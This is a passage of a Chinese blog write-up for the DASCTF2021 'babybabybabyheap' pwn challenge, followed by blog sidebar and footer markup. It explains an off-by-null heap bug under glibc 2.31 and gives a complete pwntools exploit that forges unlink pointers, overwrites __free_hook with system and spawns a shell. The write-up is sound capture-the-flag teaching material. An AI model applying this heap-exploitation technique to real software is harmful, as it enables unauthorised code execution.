+<p>vul函数<strong>只能执行一次</strong>，修改指定的堆块的内容，<strong>会溢出一个NULL</strong>。</p>
+<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>程序是有一个offset by none 的漏洞，考虑用unlink进行堆块的合并，然后获得重叠的堆块进行攻击。程序的环境是glibc2.31，由于glibc2.31中会加入一个如下的检查</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br></pre></td></tr></table></figure>
+<p>原先的unlink consolidate就不再有效，因此需要额外的想法</p>
+<p>首先这题没有开pie，也就是说我们是可以知道bss段的地址的</p>
+<ol>
+<li><p>构造fake_chunk将大小设置好</p>
+</li>
+<li><p>通过程序的分配功能将fake_chunk分配到程序中，将地址写在bss段上再释放，由于程序释放时不会清空地址，所以fakechunk的地址会一直保存在bss段，令这个地址为addr（这个地址我们时知道的）。</p>
+</li>
+<li><p>将fake_chunk的fd设置为addr-0x18，将fake_chunk的bk设置成addr-0x10，用于绕过检查</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr fd = p-&gt;fd;</span><br><span class="line">mchunkptr bk = p-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">    lb = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.31.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">""</span>, <span class="number">00</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(idx, size, con=<span class="string">'aaaa'</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"size?"</span>, str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">    p.send(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dlt</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># can be used only once</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vul</span><span class="params">(idx, con)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Sure to exit?(y/n)"</span>, <span class="string">'n'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"content?"</span>)</span><br><span class="line">    p.send(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"gift: "</span>)</span><br><span class="line">libc = int(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>], <span class="number">16</span>)-lb.sym[<span class="string">'puts'</span>]</span><br><span class="line">print(<span class="string">"libc"</span>, hex(libc))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">no pie </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">bss = <span class="number">0x404140</span></span><br><span class="line">size = <span class="number">0x100</span>+(<span class="number">0x1f0</span><span class="number">-0x80</span><span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">0x1f0</span>)</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0xf8</span>)</span><br><span class="line">alloc(<span class="number">2</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7</span>):</span><br><span class="line">    alloc(<span class="number">3</span>+i, <span class="number">0x1f0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x7</span>):</span><br><span class="line">    dlt(<span class="number">3</span>+i)</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">3</span>, <span class="number">0x80</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(size | <span class="number">1</span>)+p64(bss+<span class="number">4</span>*<span class="number">8</span><span class="number">-0x18</span>)+p64(bss+<span class="number">4</span>*<span class="number">8</span><span class="number">-0x10</span>)</span><br><span class="line">alloc(<span class="number">4</span>, <span class="number">0x80</span>, payload)  <span class="comment"># fake chunk in it</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    alloc(i+<span class="number">5</span>, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    dlt(i+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0xf0</span>*<span class="string">b'a'</span>+p64(size)</span><br><span class="line">vul(<span class="number">1</span>, payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">dlt(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">7</span>,<span class="number">0xf0</span>)</span><br><span class="line">dlt(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">5</span>, <span class="number">0x150</span>)</span><br><span class="line">payload=p64(libc+lb.sym[<span class="string">'__free_hook'</span>])</span><br><span class="line">alloc(<span class="number">6</span>, <span class="number">0x90</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">7</span>,<span class="number">0xf0</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">alloc(<span class="number">8</span>,<span class="number">0xf0</span>,p64(libc+lb.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">dlt(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># -CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/24/linux-kernel-heap/" rel="next" title="linux_kernel_heap">
+                <i class="fa fa-chevron-left"></i> linux_kernel_heap
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">xkaneiki</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">20</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.lyyl.online" title="https://www.lyyl.online" rel="noopener" target="_blank">LYYL</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://n1k0ooo.github.io/" title="https://n1k0ooo.github.io/" rel="noopener" target="_blank">N1K0_</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a1ex.online" title="https://a1ex.online" rel="noopener" target="_blank">A1ex</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DASCTF2021"><span class="nav-number">1.</span> <span class="nav-text">DASCTF2021</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fruitpie"><span class="nav-number">1.1.</span> <span class="nav-text">fruitpie</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路"><span class="nav-number">1.1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">1.1.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ParentSimulator"><span class="nav-number">1.2.</span> <span class="nav-text">ParentSimulator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析"><span class="nav-number">1.2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获得libc地址"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">获得libc地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#栈迁移，执行orw"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">栈迁移，执行orw</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babybabybabyheap"><span class="nav-number">1.3.</span> <span class="nav-text">babybabybabyheap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xkaneiki</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.1.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
